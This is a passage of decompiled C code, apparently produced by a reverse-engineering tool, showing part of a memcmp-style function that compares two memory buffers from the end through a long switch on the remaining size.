          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xb));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 10));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 10));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 9)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 9));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_8:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 8));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 8))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 8));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 7));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 7));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 6));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 6));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 5)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 5));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_4:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 4));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 4))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 4));
          if ((uVar1 == uVar2) ||
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 == 0)) {
            uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 3));
            uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 3));
            if ((uVar2 == uVar1) ||
               (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 == 0)) {
              uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 2));
              uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 2));
              if (((uVar2 == uVar1) ||
                  (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 == 0)
                  ) && (iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 1)) -
                                (uint)*(byte *)((int)_Buf2 + (_Size - 1)), iVar3 != 0)) {
                iVar3 = (uint)(0 < iVar3) * 2 + -1;
              }
            }
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
        break;
      case 0x1d:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1d));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1d))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1d));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1c));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1c));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1b));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1b));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1a)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x1a));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
      case 0x19:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x19));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x19))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x19));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x18));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x18));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x17));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x17));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x16)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x16));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_15:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x15));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x15))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x15));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x14));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x14));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x13));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x13));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x12)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x12));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_11:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x11));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x11))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x11));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x10));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x10));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xf));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xf));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xe)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0xe));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_d:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0xd));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0xd))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xd));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xc));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xc));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xb));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xb));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 10)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 10));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_9:
        if (*(int *)((int)_Buf1 + (_Size - 9)) == *(int *)((int)_Buf2 + (_Size - 9))) {
          iVar3 = 0;
        }
        else {
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 9));
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 9));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 8));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 8));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 7));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 7));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 6)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 6));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_5:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 5));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 5))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 5));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 4));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 4));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 3));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 3));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 2)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 2));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
joined_r0x0040aaf8:
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_1:
        uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 1));
        uVar1 = (uint)*(byte *)((int)_Buf1 + (_Size - 1));
        if (uVar1 == uVar2) {
          return 0;
        }
        return (uint)(0 < (int)(uVar1 - uVar2)) * 2 + -1;
      case 0x1e:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1e));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1e))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1e));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1d));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1d));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1c));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1c));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1b)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x1b));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_1a:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1a));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1a))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1a));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x19));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x19));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x18));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x18));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x17)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x17));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_16:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x16));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x16))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x16));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x15));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x15));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x14));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x14));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x13)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x13));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_12:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x12));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x12))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x12));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x11));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x11));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x10));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x10));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xf)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0xf));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_e:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0xe));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0xe))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xe));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xd));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xd));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xc));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xc));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xb)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0xb));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_a:
        if (*(int *)((int)_Buf1 + (_Size - 10)) == *(int *)((int)_Buf2 + (_Size - 10))) {
          iVar3 = 0;
        }
        else {
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 10));
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 10));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 9));
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 9));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 8));
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 8));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 7)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 7));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_6:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 6));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 6))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 6));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 5));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 5));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 4));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 4));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 3)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 3));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_2:
        if (*(short *)((int)_Buf1 + (_Size - 2)) != *(short *)((int)_Buf2 + (_Size - 2))) {
LAB_0040af18:
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 2));
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 2));
          if (uVar2 == uVar1) goto switchD_0040a332_caseD_1;
          iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1;
          goto joined_r0x0040aaf8;
        }
        break;
      case 0x1f:
        if (*(int *)((int)_Buf1 + (_Size - 0x1f)) == *(int *)((int)_Buf2 + (_Size - 0x1f))) {
          iVar3 = 0;
        }
        else {
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1f));
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1f));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1e));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1e));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1d));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1d));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1c)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x1c));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_1b:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1b));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1b))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1b));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1a));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1a));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x19));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x19));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x18)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x18));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_17:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x17));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x17))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x17));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x16));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x16));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x15));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x15));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x14)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x14));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_13:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x13));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x13))) {
          iVar3 = 0;
        }
        else {
